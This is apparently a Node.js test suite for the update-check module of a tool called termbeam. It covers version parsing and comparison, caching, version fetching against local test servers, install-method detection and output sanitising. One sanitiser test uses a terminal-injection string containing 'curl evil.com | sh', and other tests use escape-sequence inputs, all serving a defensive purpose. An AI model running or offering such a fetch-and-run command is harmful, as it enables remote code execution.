const { describe, it, beforeEach, afterEach } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const os = require('os');

describe('update-check', () => {
  let tmpDir;
  let originalEnv;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'termbeam-update-test-'));
    originalEnv = process.env.TERMBEAM_CONFIG_DIR;
    process.env.TERMBEAM_CONFIG_DIR = tmpDir;
    delete require.cache[require.resolve('../../src/utils/update-check')];
  });

  afterEach(() => {
    if (originalEnv !== undefined) {
      process.env.TERMBEAM_CONFIG_DIR = originalEnv;
    } else {
      delete process.env.TERMBEAM_CONFIG_DIR;
    }
    delete require.cache[require.resolve('../../src/utils/update-check')];
    try {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    } catch {
      // cleanup best-effort
    }
  });

  describe('normalizeVersion', () => {
    it('should parse standard semver', () => {
      const { normalizeVersion } = require('../../src/utils/update-check');
      assert.deepEqual(normalizeVersion('1.10.2'), [1, 10, 2]);
    });

    it('should strip leading v', () => {
      const { normalizeVersion } = require('../../src/utils/update-check');
      assert.deepEqual(normalizeVersion('v2.0.0'), [2, 0, 0]);
    });

    it('should drop prerelease tags', () => {
      const { normalizeVersion } = require('../../src/utils/update-check');
      assert.deepEqual(normalizeVersion('1.2.3-beta.1'), [1, 2, 3]);
    });

    it('should drop build metadata', () => {
      const { normalizeVersion } = require('../../src/utils/update-check');
      assert.deepEqual(normalizeVersion('1.2.3+build.456'), [1, 2, 3]);
    });

    it('should pad missing segments', () => {
      const { normalizeVersion } = require('../../src/utils/update-check');
      assert.deepEqual(normalizeVersion('1.0'), [1, 0, 0]);
    });

    it('should return null for non-numeric parts', () => {
      const { normalizeVersion } = require('../../src/utils/update-check');
      assert.equal(normalizeVersion('abc.def.ghi'), null);
    });

    it('should return null for empty string', () => {
      const { normalizeVersion } = require('../../src/utils/update-check');
      assert.equal(normalizeVersion(''), null);
    });

    it('should return null for non-string input', () => {
      const { normalizeVersion } = require('../../src/utils/update-check');
      assert.equal(normalizeVersion(null), null);
      assert.equal(normalizeVersion(undefined), null);
    });
  });

  describe('isNewerVersion', () => {
    it('should detect newer major version', () => {
      const { isNewerVersion } = require('../../src/utils/update-check');
      assert.equal(isNewerVersion('1.0.0', '2.0.0'), true);
    });

    it('should detect newer minor version', () => {
      const { isNewerVersion } = require('../../src/utils/update-check');
      assert.equal(isNewerVersion('1.10.2', '1.11.0'), true);
    });

    it('should detect newer patch version', () => {
      const { isNewerVersion } = require('../../src/utils/update-check');
      assert.equal(isNewerVersion('1.10.2', '1.10.3'), true);
    });

    it('should return false for same version', () => {
      const { isNewerVersion } = require('../../src/utils/update-check');
      assert.equal(isNewerVersion('1.10.2', '1.10.2'), false);
    });

    it('should return false for older version', () => {
      const { isNewerVersion } = require('../../src/utils/update-check');
      assert.equal(isNewerVersion('2.0.0', '1.0.0'), false);
    });

    it('should handle missing patch numbers', () => {
      const { isNewerVersion } = require('../../src/utils/update-check');
      assert.equal(isNewerVersion('1.0', '1.0.1'), true);
    });

    it('should treat pre-release as older than same stable version', () => {
      const { isNewerVersion } = require('../../src/utils/update-check');
      // 1.0.0-beta.1 is a pre-release of 1.0.0 — stable 1.0.0 is newer
      assert.equal(isNewerVersion('1.0.0-beta.1', '1.0.0'), true);
    });

    it('should treat pre-release as older than newer stable version', () => {
      const { isNewerVersion } = require('../../src/utils/update-check');
      assert.equal(isNewerVersion('1.0.0-rc.1', '1.0.1'), true);
    });

    it('should not show update for pre-release when latest is older stable', () => {
      const { isNewerVersion } = require('../../src/utils/update-check');
      // Running 2.0.0-rc.1, latest stable is 1.9.0 — no update
      assert.equal(isNewerVersion('2.0.0-rc.1', '1.9.0'), false);
    });

    it('should offer update from dev build to same-base stable version', () => {
      const { isNewerVersion } = require('../../src/utils/update-check');
      // Dev builds from git (e.g. 1.15.2-dev.5+gabcdef) are pre-release —
      // stable 1.15.2 is considered newer and should trigger an update
      assert.equal(isNewerVersion('1.15.2-dev.5+gabcdef', '1.15.2'), true);
    });

    it('should not show update between two pre-releases of same version', () => {
      const { isNewerVersion } = require('../../src/utils/update-check');
      // Both are pre-releases — latest is also pre-release, no update
      assert.equal(isNewerVersion('1.0.0-rc.1', '1.0.0-rc.2'), false);
    });

    it('should return false for unparseable input', () => {
      const { isNewerVersion } = require('../../src/utils/update-check');
      assert.equal(isNewerVersion('not-a-version', '1.0.0'), false);
    });
  });

  describe('cache', () => {
    it('should write and read cache', () => {
      const { writeCache, readCache } = require('../../src/utils/update-check');
      writeCache('2.0.0');
      const cache = readCache();
      assert.equal(cache.latest, '2.0.0');
      assert.ok(typeof cache.checkedAt === 'number');
      assert.ok(Date.now() - cache.checkedAt < 1000);
    });

    it('should return null for missing cache', () => {
      const { readCache } = require('../../src/utils/update-check');
      const cache = readCache();
      assert.equal(cache, null);
    });

    it('should return null for corrupt cache', () => {
      const { readCache } = require('../../src/utils/update-check');
      const cacheFile = path.join(tmpDir, 'update-check.json');
      fs.writeFileSync(cacheFile, 'not json');
      const cache = readCache();
      assert.equal(cache, null);
    });

    it('should return null for cache with wrong shape', () => {
      const { readCache } = require('../../src/utils/update-check');
      const cacheFile = path.join(tmpDir, 'update-check.json');
      fs.writeFileSync(cacheFile, JSON.stringify({ foo: 'bar' }));
      const cache = readCache();
      assert.equal(cache, null);
    });
  });

  describe('checkForUpdate', () => {
    it('should still check for dev versions', async () => {
      const mod = require('../../src/utils/update-check');
      const origFetch = mod.fetchLatestVersion;
      mod.fetchLatestVersion = async () => '2.0.0';
      try {
        const result = await mod.checkForUpdate({
          currentVersion: '1.10.2-dev',
          force: true,
        });
        assert.equal(result.updateAvailable, true);
        assert.equal(result.latest, '2.0.0');
      } finally {
        mod.fetchLatestVersion = origFetch;
      }
    });

    it('should skip check for missing version', async () => {
      const { checkForUpdate } = require('../../src/utils/update-check');
      const result = await checkForUpdate({});
      assert.equal(result.updateAvailable, false);
    });

    it('should return cached result if fresh', async () => {
      const { checkForUpdate, writeCache } = require('../../src/utils/update-check');
      writeCache('9.99.99');
      const result = await checkForUpdate({ currentVersion: '1.0.0' });
      assert.equal(result.updateAvailable, true);
      assert.equal(result.latest, '9.99.99');
    });

    it('should not return update when cached version is same', async () => {
      const { checkForUpdate, writeCache } = require('../../src/utils/update-check');
      writeCache('1.10.2');
      const result = await checkForUpdate({ currentVersion: '1.10.2' });
      assert.equal(result.updateAvailable, false);
      assert.equal(result.latest, '1.10.2');
    });

    it('should bypass cache when force is true', async () => {
      const mod = require('../../src/utils/update-check');
      // Seed with a "fresh" cache
      mod.writeCache('5.0.0');

      // Stub fetchLatestVersion to control the "remote" version
      const origFetch = mod.fetchLatestVersion;
      let fetchCalls = 0;
      mod.fetchLatestVersion = async () => {
        fetchCalls++;
        return '6.0.0';
      };

      try {
        // Without force, should use cache (fetcher not called)
        const cached = await mod.checkForUpdate({ currentVersion: '1.0.0' });
        assert.equal(cached.latest, '5.0.0');
        assert.equal(cached.updateAvailable, true);
        assert.equal(fetchCalls, 0);

        // With force: true, should bypass cache and call fetcher
        const forced = await mod.checkForUpdate({ currentVersion: '1.0.0', force: true });
        assert.equal(fetchCalls, 1);
        assert.equal(forced.latest, '6.0.0');
        assert.equal(forced.updateAvailable, true);
      } finally {
        mod.fetchLatestVersion = origFetch;
      }
    });

    it('should handle network failure gracefully', async () => {
      const mod = require('../../src/utils/update-check');
      const origFetch = mod.fetchLatestVersion;

      try {
        // Simulate a network failure
        mod.fetchLatestVersion = async () => null;

        const result = await mod.checkForUpdate({ currentVersion: '1.0.0', force: true });
        assert.equal(result.updateAvailable, false);
        assert.equal(result.latest, null);
        assert.equal(result.current, '1.0.0');
      } finally {
        mod.fetchLatestVersion = origFetch;
      }
    });
  });

  describe('sanitizeVersion', () => {
    it('should strip ANSI escape sequences', () => {
      const { sanitizeVersion } = require('../../src/utils/update-check');
      assert.equal(sanitizeVersion('\x1b[31m1.0.0\x1b[0m'), '1.0.0');
    });

    it('should strip control characters', () => {
      const { sanitizeVersion } = require('../../src/utils/update-check');
      assert.equal(sanitizeVersion('1.0.0\x00\x1f'), '1.0.0');
    });

    it('should pass through clean version strings', () => {
      const { sanitizeVersion } = require('../../src/utils/update-check');
      assert.equal(sanitizeVersion('1.10.2'), '1.10.2');
    });

    it('should strip complex terminal injection attempts', () => {
      const { sanitizeVersion } = require('../../src/utils/update-check');
      const malicious = '\x1b[2J\x1b[H\x1b[31mRun: curl evil.com | sh\x1b[0m';
      const result = sanitizeVersion(malicious);
      assert.ok(!result.includes('\x1b'));
      assert.ok(!result.includes('[2J'));
    });
  });

  describe('fetchLatestVersion', () => {
    it('should return a function', () => {
      const { fetchLatestVersion } = require('../../src/utils/update-check');
      assert.equal(typeof fetchLatestVersion, 'function');
    });

    it('should be mockable via module.exports for checkForUpdate', async () => {
      const mod = require('../../src/utils/update-check');
      const origFetch = mod.fetchLatestVersion;
      mod.fetchLatestVersion = async () => '99.0.0';
      try {
        const result = await mod.checkForUpdate({ currentVersion: '1.0.0', force: true });
        assert.equal(result.latest, '99.0.0');
        assert.equal(result.updateAvailable, true);
      } finally {
        mod.fetchLatestVersion = origFetch;
      }
    });

    it('should fetch from a local test server', async () => {
      const http = require('http');
      const server = http.createServer((_req, res) => {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ version: '9.8.7' }));
      });
      await new Promise((r) => server.listen(0, '127.0.0.1', r));
      const port = server.address().port;
      try {
        const { fetchLatestVersion } = require('../../src/utils/update-check');
        const result = await fetchLatestVersion(`http://127.0.0.1:${port}/`);
        assert.equal(result, '9.8.7');
      } finally {
        server.close();
      }
    });

    it('should return null on server error', async () => {
      const http = require('http');
      const server = http.createServer((_req, res) => {
        res.writeHead(500);
        res.end();
      });
      await new Promise((r) => server.listen(0, '127.0.0.1', r));
      const port = server.address().port;
      try {
        const { fetchLatestVersion } = require('../../src/utils/update-check');
        const result = await fetchLatestVersion(`http://127.0.0.1:${port}/`);
        assert.equal(result, null);
      } finally {
        server.close();
      }
    });

    it('should return null on invalid JSON', async () => {
      const http = require('http');
      const server = http.createServer((_req, res) => {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end('not json');
      });
      await new Promise((r) => server.listen(0, '127.0.0.1', r));
      const port = server.address().port;
      try {
        const { fetchLatestVersion } = require('../../src/utils/update-check');
        const result = await fetchLatestVersion(`http://127.0.0.1:${port}/`);
        assert.equal(result, null);
      } finally {
        server.close();
      }
    });
  });

  describe('detectInstallMethod', () => {
    let origNpmCommand;
    let origNpmExecpath;

    beforeEach(() => {
      origNpmCommand = process.env.npm_command;
      origNpmExecpath = process.env.npm_execpath;
    });

    afterEach(() => {
      if (origNpmCommand !== undefined) process.env.npm_command = origNpmCommand;
      else delete process.env.npm_command;
      if (origNpmExecpath !== undefined) process.env.npm_execpath = origNpmExecpath;
      else delete process.env.npm_execpath;
    });

    it('should detect npx via npm_command=exec', () => {
      process.env.npm_command = 'exec';
      const { detectInstallMethod } = require('../../src/utils/update-check');
      const result = detectInstallMethod();
      assert.equal(result.method, 'npx');
      assert.ok(result.command.includes('npx'));
      assert.equal(result.canAutoUpdate, false);
      assert.equal(result.restartStrategy, 'none');
    });

    it('should detect yarn via npm_execpath', () => {
      delete process.env.npm_command;
      process.env.npm_execpath = '/usr/local/lib/node_modules/yarn/bin/yarn.js';
      const { detectInstallMethod } = require('../../src/utils/update-check');
      const result = detectInstallMethod();
      assert.equal(result.method, 'yarn');
      assert.ok(result.command.includes('yarn'));
      assert.equal(result.canAutoUpdate, true);
    });

    it('should detect pnpm via npm_execpath', () => {
      delete process.env.npm_command;
      process.env.npm_execpath = '/usr/local/lib/node_modules/pnpm/bin/pnpm.cjs';
      const { detectInstallMethod } = require('../../src/utils/update-check');
      const result = detectInstallMethod();
      assert.equal(result.method, 'pnpm');
      assert.ok(result.command.includes('pnpm'));
      assert.equal(result.canAutoUpdate, true);
    });

    it('should detect source when running from git repo', () => {
      delete process.env.npm_command;
      delete process.env.npm_execpath;
      // Clear PM2 env vars to test the non-PM2 source path
      const origPm2Home = process.env.PM2_HOME;
      const origPmId = process.env.pm_id;
      const origPm2Usage = process.env.PM2_USAGE;
      delete process.env.PM2_HOME;
      delete process.env.pm_id;
      delete process.env.PM2_USAGE;
      delete require.cache[require.resolve('../../src/utils/update-check')];
      try {
        const { detectInstallMethod } = require('../../src/utils/update-check');
        const result = detectInstallMethod();
        // Running tests from the repo — .git exists and not in node_modules.
        // In Docker/CI containers, may report 'docker' instead — both are non-auto-updatable.
        assert.ok(
          ['source', 'docker'].includes(result.method),
          `expected 'source' or 'docker', got '${result.method}'`,
        );
        assert.equal(result.canAutoUpdate, false);
        assert.equal(result.restartStrategy, 'none');
        if (result.method === 'source') {
          assert.ok(result.cwd, 'source method should include cwd');
        }
      } finally {
        if (origPm2Home !== undefined) process.env.PM2_HOME = origPm2Home;
        else delete process.env.PM2_HOME;
        if (origPmId !== undefined) process.env.pm_id = origPmId;
        else delete process.env.pm_id;
        if (origPm2Usage !== undefined) process.env.PM2_USAGE = origPm2Usage;
        else delete process.env.PM2_USAGE;
      }
    });

    it('should enable auto-update for source under PM2', () => {
      delete process.env.npm_command;
      delete process.env.npm_execpath;
      const origPm2Home = process.env.PM2_HOME;
      const origPmId = process.env.pm_id;
      process.env.PM2_HOME = '/home/user/.pm2';
      process.env.pm_id = '0';
      delete require.cache[require.resolve('../../src/utils/update-check')];
      try {
        const {
          detectInstallMethod,
          isRunningFromSource,
        } = require('../../src/utils/update-check');
        if (!isRunningFromSource()) return; // Skip in Docker/CI
        const result = detectInstallMethod();
        assert.equal(result.method, 'source');
        assert.equal(result.canAutoUpdate, true);
        assert.equal(result.restartStrategy, 'pm2');
        assert.ok(result.command.includes('pm2 restart'), 'command should include pm2 restart');
        assert.ok(result.installCmd, 'should have installCmd for auto-update');
        assert.ok(result.installArgs, 'should have installArgs for auto-update');
        assert.ok(result.cwd, 'should include cwd for source install');
      } finally {
        if (origPm2Home !== undefined) process.env.PM2_HOME = origPm2Home;
        else delete process.env.PM2_HOME;
        if (origPmId !== undefined) process.env.pm_id = origPmId;
        else delete process.env.pm_id;
      }
    });

    it('getSourceRoot should return repo root directory', () => {
      const { getSourceRoot } = require('../../src/utils/update-check');
      const root = getSourceRoot();
      assert.ok(root, 'should find source root');
      assert.ok(fs.existsSync(path.join(root, '.git')), 'source root should contain .git');
      assert.ok(
        fs.existsSync(path.join(root, 'package.json')),
        'source root should contain package.json',
      );
    });

    it('should return canAutoUpdate and restartStrategy fields', () => {
      process.env.npm_command = 'exec';
      const { detectInstallMethod } = require('../../src/utils/update-check');
      const result = detectInstallMethod();
      assert.ok('canAutoUpdate' in result, 'should have canAutoUpdate field');
      assert.ok('restartStrategy' in result, 'should have restartStrategy field');
    });

    it('isRunningFromSource should return true for repo directory', () => {
      const { isRunningFromSource } = require('../../src/utils/update-check');
      // Tests run from the repo, so this should be true
      assert.equal(isRunningFromSource(), true);
    });

    it('isRunningUnderPm2 should return false when no PM2 env vars', () => {
      const origPm2Home = process.env.PM2_HOME;
      const origPmId = process.env.pm_id;
      const origPm2Usage = process.env.PM2_USAGE;
      delete process.env.PM2_HOME;
      delete process.env.pm_id;
      delete process.env.PM2_USAGE;
      try {
        const { isRunningUnderPm2 } = require('../../src/utils/update-check');
        assert.equal(isRunningUnderPm2(), false);
      } finally {
        if (origPm2Home !== undefined) process.env.PM2_HOME = origPm2Home;
        if (origPmId !== undefined) process.env.pm_id = origPmId;
        if (origPm2Usage !== undefined) process.env.PM2_USAGE = origPm2Usage;
      }
    });

    it('isRunningUnderPm2 should return true when PM2_HOME is set', () => {
      const orig = process.env.PM2_HOME;
      process.env.PM2_HOME = '/home/user/.pm2';
      try {
        const { isRunningUnderPm2 } = require('../../src/utils/update-check');
        assert.equal(isRunningUnderPm2(), true);
      } finally {
        if (orig !== undefined) process.env.PM2_HOME = orig;
        else delete process.env.PM2_HOME;
      }
    });
  });

  describe('normalizeVersion edge cases', () => {
    it('should handle capital V prefix', () => {
      const { normalizeVersion } = require('../../src/utils/update-check');
      assert.deepEqual(normalizeVersion('V2.0.0'), [2, 0, 0]);
    });

    it('should return null for more than 3 segments', () => {
      const { normalizeVersion } = require('../../src/utils/update-check');
      assert.equal(normalizeVersion('1.2.3.4'), null);
    });

    it('should pad single number version', () => {
      const { normalizeVersion } = require('../../src/utils/update-check');
      assert.deepEqual(normalizeVersion('5'), [5, 0, 0]);
    });

    it('should return null for version that becomes empty after stripping metadata', () => {
      const { normalizeVersion } = require('../../src/utils/update-check');
      // 'v-beta.1' -> strip v -> '-beta.1' -> strip prerelease -> '' -> null
      assert.equal(normalizeVersion('v-beta.1'), null);
    });

    it('should handle version with both build metadata and prerelease', () => {
      const { normalizeVersion } = require('../../src/utils/update-check');
      assert.deepEqual(normalizeVersion('1.2.3-rc.1+build.123'), [1, 2, 3]);
    });

    it('should return null for whitespace-only string', () => {
      const { normalizeVersion } = require('../../src/utils/update-check');
      assert.equal(normalizeVersion('   '), null);
    });

    it('should return null for version with only build metadata after v', () => {
      const { normalizeVersion } = require('../../src/utils/update-check');
      assert.equal(normalizeVersion('v+build'), null);
    });

    it('should return null for number input', () => {
      const { normalizeVersion } = require('../../src/utils/update-check');
      assert.equal(normalizeVersion(123), null);
    });
  });

  describe('isPreRelease edge cases', () => {
    it('should return false for non-string input', () => {
      const { isPreRelease } = require('../../src/utils/update-check');
      assert.equal(isPreRelease(null), false);
      assert.equal(isPreRelease(undefined), false);
      assert.equal(isPreRelease(123), false);
    });

    it('should handle capital V prefix', () => {
      const { isPreRelease } = require('../../src/utils/update-check');
      assert.equal(isPreRelease('V1.0.0-rc.1'), true);
      assert.equal(isPreRelease('V1.0.0'), false);
    });

    it('should return false for version with only build metadata', () => {
      const { isPreRelease } = require('../../src/utils/update-check');
      assert.equal(isPreRelease('1.0.0+build.123'), false);
    });

    it('should return true for version with both prerelease and build metadata', () => {
      const { isPreRelease } = require('../../src/utils/update-check');
      assert.equal(isPreRelease('1.0.0-beta.1+build.123'), true);
    });
  });

  describe('isNewerVersion edge cases', () => {
    it('should return false when latest is unparseable', () => {
      const { isNewerVersion } = require('../../src/utils/update-check');
      assert.equal(isNewerVersion('1.0.0', 'not-a-version'), false);
    });

    it('should return false when current minor is higher', () => {
      const { isNewerVersion } = require('../../src/utils/update-check');
      assert.equal(isNewerVersion('1.11.0', '1.10.0'), false);
    });

    it('should return false when current patch is higher', () => {
      const { isNewerVersion } = require('../../src/utils/update-check');
      assert.equal(isNewerVersion('1.0.5', '1.0.3'), false);
    });

    it('should return false when both are same pre-release base and latest is stable', () => {
      const { isNewerVersion } = require('../../src/utils/update-check');
      // Both pre-releases of same version - no update
      assert.equal(isNewerVersion('1.0.0-alpha', '1.0.0-beta'), false);
    });
  });

  describe('sanitizeVersion edge cases', () => {
    it('should return empty string for non-string input', () => {
      const { sanitizeVersion } = require('../../src/utils/update-check');
      assert.equal(sanitizeVersion(null), '');
      assert.equal(sanitizeVersion(undefined), '');
      assert.equal(sanitizeVersion(42), '');
    });

    it('should strip OSC sequences (ESC ] ... BEL)', () => {
      const { sanitizeVersion } = require('../../src/utils/update-check');
      const osc = '\x1b]0;malicious title\x07';
      assert.equal(sanitizeVersion(osc + '1.0.0'), '1.0.0');
    });

    it('should strip OSC sequences (ESC ] ... ESC \\)', () => {
      const { sanitizeVersion } = require('../../src/utils/update-check');
      const osc = '\x1b]0;title\x1b\\';
      assert.equal(sanitizeVersion(osc + '1.0.0'), '1.0.0');
    });

    it('should strip DCS sequences', () => {
      const { sanitizeVersion } = require('../../src/utils/update-check');
      const dcs = '\x1bP1$r0m\x1b\\';
      assert.equal(sanitizeVersion(dcs + '1.0.0'), '1.0.0');
    });

    it('should strip single-character ESC sequences', () => {
      const { sanitizeVersion } = require('../../src/utils/update-check');
      assert.equal(sanitizeVersion('\x1bM1.0.0'), '1.0.0');
    });

    it('should strip C1 control characters (0x80-0x9f)', () => {
      const { sanitizeVersion } = require('../../src/utils/update-check');
      assert.equal(sanitizeVersion('1.0\x80\x9f.0'), '1.0.0');
    });

    it('should handle empty string', () => {
      const { sanitizeVersion } = require('../../src/utils/update-check');
      assert.equal(sanitizeVersion(''), '');
    });
  });

  describe('fetchLatestVersion edge cases', () => {
    it('should return null when version field is missing from response', async () => {
      const http = require('http');
      const server = http.createServer((_req, res) => {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ name: 'termbeam' }));
      });
      await new Promise((r) => server.listen(0, '127.0.0.1', r));
      const port = server.address().port;
      try {
        const { fetchLatestVersion } = require('../../src/utils/update-check');
        const result = await fetchLatestVersion(`http://127.0.0.1:${port}/`);
        assert.equal(result, null);
      } finally {
        server.close();
      }
    });

    it('should return null when version is non-string in response', async () => {
      const http = require('http');
      const server = http.createServer((_req, res) => {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ version: 12345 }));
      });
      await new Promise((r) => server.listen(0, '127.0.0.1', r));
      const port = server.address().port;
      try {
        const { fetchLatestVersion } = require('../../src/utils/update-check');
        const result = await fetchLatestVersion(`http://127.0.0.1:${port}/`);
        assert.equal(result, null);
      } finally {
        server.close();
      }
    });

    it('should return null for non-semver version in response', async () => {
      const http = require('http');
      const server = http.createServer((_req, res) => {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ version: 'not-semver' }));
      });
      await new Promise((r) => server.listen(0, '127.0.0.1', r));
      const port = server.address().port;
      try {
        const { fetchLatestVersion } = require('../../src/utils/update-check');
        const result = await fetchLatestVersion(`http://127.0.0.1:${port}/`);
        assert.equal(result, null);
      } finally {
        server.close();
      }
    });

    it('should return null for oversized response', async () => {
      const http = require('http');
      const server = http.createServer((_req, res) => {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        // Send more than MAX_RESPONSE_SIZE (100KB)
        res.end('x'.repeat(200 * 1024));
      });
      await new Promise((r) => server.listen(0, '127.0.0.1', r));
      const port = server.address().port;
      try {
        const { fetchLatestVersion } = require('../../src/utils/update-check');
        const result = await fetchLatestVersion(`http://127.0.0.1:${port}/`);
        assert.equal(result, null);
      } finally {
        server.close();
      }
    });

    it('should return null on connection error', async () => {
      const net = require('net');
      const server = net.createServer((socket) => socket.destroy());
      await new Promise((r) => server.listen(0, '127.0.0.1', r));
      const port = server.address().port;
      try {
        const { fetchLatestVersion } = require('../../src/utils/update-check');
        const result = await fetchLatestVersion(`http://127.0.0.1:${port}/`);
        assert.equal(result, null);
      } finally {
        server.close();
      }
    });

    it('should return null when version is null in response', async () => {
      const http = require('http');
      const server = http.createServer((_req, res) => {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ version: null }));
      });
      await new Promise((r) => server.listen(0, '127.0.0.1', r));
      const port = server.address().port;
      try {
        const { fetchLatestVersion } = require('../../src/utils/update-check');
        const result = await fetchLatestVersion(`http://127.0.0.1:${port}/`);
        assert.equal(result, null);
      } finally {
        server.close();
      }
    });
  });

  describe('checkForUpdate edge cases', () => {
    it('should fetch from registry when cache is expired', async () => {
      const mod = require('../../src/utils/update-check');
      const cacheFile = path.join(tmpDir, 'update-check.json');
      fs.writeFileSync(
        cacheFile,
        JSON.stringify({ latest: '1.0.0', checkedAt: Date.now() - 25 * 60 * 60 * 1000 }),
      );

      const origFetch = mod.fetchLatestVersion;
      let fetchCalled = false;
      mod.fetchLatestVersion = async () => {
        fetchCalled = true;
        return '3.0.0';
      };
      try {
        const result = await mod.checkForUpdate({ currentVersion: '1.0.0' });
        assert.ok(fetchCalled, 'should have fetched from registry');
        assert.equal(result.latest, '3.0.0');
        assert.equal(result.updateAvailable, true);
      } finally {
        mod.fetchLatestVersion = origFetch;
      }
    });

    it('should ignore cached version with invalid format', async () => {
      const mod = require('../../src/utils/update-check');
      const cacheFile = path.join(tmpDir, 'update-check.json');
      fs.writeFileSync(
        cacheFile,
        JSON.stringify({ latest: 'not-a-version', checkedAt: Date.now() }),
      );

      const origFetch = mod.fetchLatestVersion;
      let fetchCalled = false;
      mod.fetchLatestVersion = async () => {
        fetchCalled = true;
        return '2.0.0';
      };
      try {
        const result = await mod.checkForUpdate({ currentVersion: '1.0.0' });
        assert.ok(fetchCalled, 'should bypass invalid cached version');
        assert.equal(result.latest, '2.0.0');
      } finally {
        mod.fetchLatestVersion = origFetch;
      }
    });

    it('should ignore cached version with non-string latest', async () => {
      const mod = require('../../src/utils/update-check');
      const cacheFile = path.join(tmpDir, 'update-check.json');
      fs.writeFileSync(cacheFile, JSON.stringify({ latest: 12345, checkedAt: Date.now() }));

      const origFetch = mod.fetchLatestVersion;
      let fetchCalled = false;
      mod.fetchLatestVersion = async () => {
        fetchCalled = true;
        return '2.0.0';
      };
      try {
        const result = await mod.checkForUpdate({ currentVersion: '1.0.0' });
        assert.ok(fetchCalled, 'should bypass non-string cached version');
        assert.equal(result.latest, '2.0.0');
      } finally {
        mod.fetchLatestVersion = origFetch;
      }
    });

    it('should handle fetch returning null with no cached data', async () => {
      const mod = require('../../src/utils/update-check');
      const origFetch = mod.fetchLatestVersion;
      mod.fetchLatestVersion = async () => null;
      try {
        const result = await mod.checkForUpdate({ currentVersion: '1.0.0', force: true });
        assert.equal(result.updateAvailable, false);
        assert.equal(result.latest, null);
        assert.equal(result.current, '1.0.0');
      } finally {
        mod.fetchLatestVersion = origFetch;
      }
    });
  });

  describe('writeCache edge cases', () => {
    it('should silently handle write failure', () => {
      const origDir = process.env.TERMBEAM_CONFIG_DIR;
      // Use a path guaranteed to be invalid on all platforms
      const badPath =
        process.platform === 'win32' ? 'Z:\\nonexistent\\impossible\\path' : '/dev/null/impossible';
      process.env.TERMBEAM_CONFIG_DIR = badPath;
      delete require.cache[require.resolve('../../src/utils/update-check')];
      try {
        const { writeCache } = require('../../src/utils/update-check');
        assert.doesNotThrow(() => writeCache('1.0.0'));
      } finally {
        process.env.TERMBEAM_CONFIG_DIR = origDir;
        delete require.cache[require.resolve('../../src/utils/update-check')];
      }
    });
  });
});
